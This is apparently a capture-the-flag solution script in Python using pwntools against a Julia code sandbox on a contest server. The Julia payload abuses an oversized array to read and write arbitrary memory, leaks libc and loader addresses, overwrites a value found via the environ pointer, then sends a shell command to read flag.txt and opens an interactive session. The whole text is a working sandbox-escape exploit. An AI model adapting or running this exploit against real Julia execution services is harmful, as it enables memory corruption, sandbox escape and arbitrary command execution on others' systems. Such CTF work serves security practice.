from pwn import * 

payload = """
x = Array{UInt64}(undef, 2^3, 2^59);p = Base.parse(Int64, chop(repr(pointer(x)), head=13, tail=0));libc_base = x[(0x404018-p)÷8+2^61+1]-0x27280;ld_base=x[(libc_base+0x1d2020-p)÷8+2^61+1]-0x31b0;environ_ptr = x[(ld_base+0x342d0-p)÷8+2^61+1];x[(environ_ptr-0xb90-p)÷8+2^61+1] = 1
""".strip()

# io = remote("localhost", 5000)
io = remote("chal3.fwectf.com", 8003)

io.recvuntil(b"Enter julia code> \n")
io.sendline(payload.encode())
io.sendline(b"run(`cat flag.txt`)")
io.interactive()